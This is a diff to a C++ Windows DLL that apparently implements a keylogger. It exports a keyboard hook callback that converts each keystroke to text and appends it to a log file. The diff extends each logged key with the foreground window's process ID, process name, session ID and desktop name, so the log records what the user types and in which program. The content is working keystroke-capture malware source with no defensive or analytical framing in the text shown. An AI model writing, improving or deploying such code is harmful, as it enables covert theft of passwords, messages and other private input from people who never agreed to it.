@@ -10,7 +10,7 @@
 #include <stdio.h>
 #include <fstream>
 #include <thread>
-
+#include <psapi.h> 
 BOOL ReadStringFromSharedMemoryAndDisplay(std::wstring* source, const std::wstring& key);
 std::wstring logFilePath;
 std::wofstream logFile;
@@ -21,6 +21,53 @@ extern "C" __declspec(dllexport) void setFilePath(const std::wstring& filePath)
 {
 	// Deep copy the provided file path to the global variable
 	logFilePath = filePath;
+}
+/*
+BOOL CreateThread() {
+	HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
+	if (hThread == NULL) {
+		MessageBoxW(NULL, L"Failed to create thread", L"Error", MB_OK | MB_ICONERROR);
+		return FALSE;
+	}
+}
+*/
+std::wstring GetProcessName(DWORD processID) {
+	std::wstring processName = L"Unknown";
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+	if (hProcess != NULL) {
+		HMODULE hMod;
+		DWORD cbNeeded;
+		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
+			wchar_t szProcessName[MAX_PATH];
+			if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(wchar_t))) {
+				processName = szProcessName;
+			}
+		}
+		CloseHandle(hProcess);
+	}
+	return processName;
+}
+std::wstring GetDesktopName(DWORD processID) {
+	std::wstring desktopName = L"Unknown";
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+	if (hProcess != NULL) {
+		// Get the primary thread ID
+		DWORD threadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
+		if (threadID != 0) {
+			HDESK hDesk = GetThreadDesktop(threadID);
+			if (hDesk != NULL) {
+				wchar_t deskName[MAX_PATH];
+				DWORD needed;
+				if (GetUserObjectInformation(hDesk, UOI_NAME, deskName, sizeof(deskName), &needed)) {
+					desktopName = deskName;
+				}
+			}
+		}
+		CloseHandle(hProcess);
+	}
+	return desktopName;
 }
 std::wstring FormatterString(std::wstring& keyStr) {
 
@@ -38,22 +85,22 @@ std::wstring FormatterString(std::wstring& keyStr) {
 
 	std::wstring timestamp = ss.str();
 
+	HWND hwnd = GetForegroundWindow();
+	DWORD processID;
+	GetWindowThreadProcessId(hwnd, &processID);
+	std::wstring processName = GetProcessName(processID);
+	std::wstring desktopName = GetDesktopName(processID);
+	DWORD sessionId;
+	if (!ProcessIdToSessionId(processID, &sessionId)) {
+		sessionId = -1; // If the call fails, set session ID to -1
+	}
+
 	// Format the final log string
 	std::wstringstream finalLog;
-	finalLog << L"['" << keyStr << L"', " << timestamp << L"]";
+	finalLog << L"['" << keyStr << L"', " << timestamp << L"'( " << "ProceessId: " << processID << L"', " << "ProcessName: " << processName << L"', " << "Session Id: " << sessionId << L"', " << "Desktop Name: " << desktopName << L" ')" << L"]";
 
 	return finalLog.str();
 }
-
-/*
-BOOL CreateThread() {
-	HANDLE hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);
-	if (hThread == NULL) {
-		MessageBoxW(NULL, L"Failed to create thread", L"Error", MB_OK | MB_ICONERROR);
-		return FALSE;
-	}
-}
-*/
 extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 		// Decode lParam to get key event details
@@ -80,12 +127,11 @@ extern "C" __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM
 			// Translate the virtual key code to a character
 			int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);
 			if (result > 0) {
-
+			
 				key << buffer;
 				std::wcout << key.str() << std::endl;
 				std::wstring key_str = key.str();
 				wchar_t key2 = L'K';
-				//MessageBox(NULL, L"Your message here", logFilePath.c_str(), MB_OK);
 				logFile.open(logFilePath, std::ios_base::app);
 				logFile << FormatterString(key_str) << std::endl;
 				logFile.close();
